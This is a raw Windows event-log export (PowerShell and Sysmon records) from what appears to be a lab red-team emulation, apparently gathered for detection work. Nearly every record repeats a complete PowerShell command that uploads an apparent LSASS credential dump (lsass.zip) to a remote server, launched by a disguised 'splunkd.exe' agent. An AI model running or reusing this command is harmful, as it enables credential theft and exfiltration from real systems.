	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Environment,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1546,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,7,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,FileSystem,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1547,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,9,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Function,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1548,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,11,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Variable,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1549,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:22.805",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.sysmon_operational,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Process Create (rule: ProcessCreate),verified,process,1,"Oct 21, 2022 @ 03:08:25.601",windows.sysmon_operational,"Oct 21, 2022 @ 03:08:49.000",event,windows,Microsoft-Windows-Sysmon,-,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2022-10-21 07:08:22.805
ProcessGuid: {7a53022b-4566-6352-c301-000000000b00}
ProcessId: 7036
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ""
CurrentDirectory: C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\
User: VAGRANT\vagrant
LogonGuid: {7a53022b-2aa0-6352-661a-050000000000}
LogonId: 0x51A66
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {7a53022b-43e5-6352-6b01-000000000b00}
ParentProcessId: 2224
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://192.168.33.12:8888 -group red 
ParentUser: VAGRANT\vagrant",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",5,"powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); """,{7a53022b-4566-6352-c301-000000000b00},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,7353f60b1739074eb17c5f4dddefe239,6cbce4a295c163791b60fc23d285e6d84f28ee4c,de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c,powershell.exe,"C:\Users\Public\splunkd.exe, -server, http://192.168.33.12:8888, -group, red",5,"""C:\Users\Public\splunkd.exe"" -server http://192.168.33.12:8888 -group red ",{7a53022b-43e5-6352-6b01-000000000b00},C:\Users\Public\splunkd.exe,splunkd.exe,"2,224",Microsoft Corporation,Windows PowerShell,10.0.17763.1 (WinBuild.160101.0800),741776aaccfc5b71ff59832dcdcace0f,PowerShell.EXE,Microsoft Windows Operating System,"7,036",-,-,C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\,-,-,-,-,-,-,"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c, 6cbce4a295c163791b60fc23d285e6d84f28ee4c, 7353f60b1739074eb17c5f4dddefe239, 741776aaccfc5b71ff59832dcdcace0f",vagrant,"technique_id=T1059.001,technique_name=PowerShell",-,-,-,VAGRANT,S-1-5-18,vagrant,-,wineventlog,Microsoft-Windows-Sysmon/Operational,vagrant,-,Microsoft Corporation,-,Windows PowerShell,-,10.0.17763.1 (WinBuild.160101.0800),-,High,{7a53022b-2aa0-6352-661a-050000000000},0x51a66,VAGRANT\vagrant,Microsoft Windows Operating System,-,-,-,-,-,-,-,-,1,1,-,Info,"2,716","3,916",{5770385f-c22a-43e0-bf4c-06f5698ffbd9},Microsoft-Windows-Sysmon,6504,Process Create (rule: ProcessCreate),NT AUTHORITY,S-1-5-18,SYSTEM,User,5
